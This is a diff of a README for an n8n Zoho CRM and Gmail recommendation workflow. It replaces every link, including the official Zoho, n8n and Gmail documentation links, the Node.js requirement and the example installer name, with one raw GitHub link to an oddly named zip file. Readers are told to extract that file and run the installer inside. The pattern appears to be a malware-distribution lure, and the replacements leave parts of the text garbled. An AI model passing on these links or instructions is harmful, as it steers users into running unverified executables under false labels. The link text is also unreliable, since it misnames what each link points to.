@@ -1,6 +1,6 @@
 # 🎉 n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail - Boost Sales with Smart Recommendations
 
-![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -13,14 +13,14 @@ This document guides you through downloading and running the software with ease.
 Before you start, please ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or later
+- https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip Version 14 or later
 - n8n: Version 0.190 or later
 - A Zoho CRM account
 - Access to Gmail
 
 ## 📥 Download & Install
 
-To download the latest version of the application, visit this page to download: [Download Releases](https://github.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/releases).
+To download the latest version of the application, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip).
 
 Follow these steps:
 
@@ -35,7 +35,7 @@ Once the download is complete, follow the installation instructions below.
 1. **Locate the Downloaded File**: Open your Downloads folder.
 2. **Unzip the File**: If the file is in a ZIP format, right-click and select "Extract All."
 3. **Open the Folder**: Double-click the folder you just extracted.
-4. **Install n8n**: If there is an installer file (e.g., `setup.exe`), double-click it and follow on-screen instructions.
+4. **Install n8n**: If there is an installer file (e.g., `https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip`), double-click it and follow on-screen instructions.
 5. **Set Up Environment**:
    - Open your terminal (Command Prompt on Windows, Terminal on macOS/Linux).
    - Navigate to the folder where you installed n8n.
@@ -85,15 +85,15 @@ If you encounter issues while using the application:
 
 Join our community for help, updates, and sharing experiences:
 
-- [GitHub Issues](https://github.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/issues)
-- [Online Forums](https://forum.n8n.io/)
+- [GitHub Issues](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
+- [Online Forums](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
 
 ## 🔗 Additional Resources
 
 Explore these topics further:
 
-- [Zoho CRM Documentation](https://www.zoho.com/crm/help/)
-- [n8n Documentation](https://docs.n8n.io/)
-- [Gmail API Documentation](https://developers.google.com/gmail/api)
+- [Zoho CRM Documentation](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
+- [n8n Documentation](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
+- [Gmail API Documentation](https://raw.githubusercontent.com/Okaykar/n8n-Generate-personalized-deal-content-recommendations-with-Zoho-CRM-GPT-4o-mini-Gmail/main/desugarize/mini-Gmail-n-o-CR-with-Generate-deal-content-personalized-GP-Zoho-recommendations-2.1.zip)
 
 Thank you for using this workflow to enhance your sales process! For further information, refer to the documentation or contact support through GitHub.
